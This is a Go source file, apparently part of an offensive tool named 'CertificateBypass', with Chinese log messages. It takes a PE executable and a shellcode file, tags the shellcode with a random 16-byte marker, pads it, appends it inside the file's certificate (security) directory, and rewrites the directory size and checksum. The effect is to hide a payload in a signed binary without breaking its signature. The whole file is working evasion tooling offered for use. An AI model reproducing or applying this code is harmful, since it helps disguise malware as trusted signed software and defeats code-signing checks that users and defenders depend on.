package CertificateBypass

import (
	"PEi/PEedit"
	"PEi/Tools"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"os"
)

func GetHashCode(randByte []byte) []byte {
	var a [16]byte
	var b []byte

	if len(randByte) < 16 {

		fmt.Printf("输入的随机数长度为 %d 小于16位, 将自动生成随机数\n", len(randByte))
		_, err := rand.Read(a[:])
		if err != nil {
			log.Panicf("随机数生成异常 %s", err)
		}
		for _, i := range a {
			b = append(b, i)
		}
		encodedStr := hex.EncodeToString(b)
		fmt.Printf("16位随机数的值为: %v\n", encodedStr)
		return b
	} else {

		encodedStr := hex.EncodeToString(randByte)
		fmt.Printf("16位随机数的值为: %v\n", encodedStr)
		return randByte
	}
}

func GetShellCode(codeName string, randByte []byte) []byte {
	ShellBytes, err := os.ReadFile(codeName)
	if err != nil {
		log.Panicf("读取文件 %s 异常 %s", codeName, err)
	}
	fmt.Printf("SHELLCODE的长度为: %v\n", len(ShellBytes))
	HashCode := GetHashCode(randByte)
	NewShellBytes := append(HashCode, ShellBytes...)
	// fmt.Printf("别问，问就是要补%d个0\n", 8-len(NewShellBytes)%8)
	WeNeedZero := 8 - len(NewShellBytes)%8
	for i := 0; i < WeNeedZero; i++ {
		// fmt.Printf("第%d个0\n", i+1)
		NewShellBytes = append(NewShellBytes, 0x00)
	}
	// fmt.Printf("NewShellBytes: %v\n", NewShellBytes)
	return NewShellBytes
}

func Run(filename string, outname string, codeName string, randByte []byte) {
	fileBytes, err := os.ReadFile(filename)
	if err != nil {
		log.Panicf("读取文件 %s 异常 %s", filename, err)
	}
	// fmt.Printf("fileBytes: %v\n", fileBytes)
	PE := PEedit.GetPeAddress(fileBytes)
	ShellBytes := GetShellCode(codeName, randByte)
	fileBytes = PEedit.WriteSecurityDirectorySizeAndPE(fileBytes, PE, uint32(len(ShellBytes)))
	fileBytes = append(fileBytes, ShellBytes...)
	NewCheckSum := Tools.GeneratePECheckSum(fileBytes)
	fileBytes = PEedit.WriteCheckSum(fileBytes, PE, NewCheckSum)
	os.WriteFile(outname, fileBytes, 0644)
}
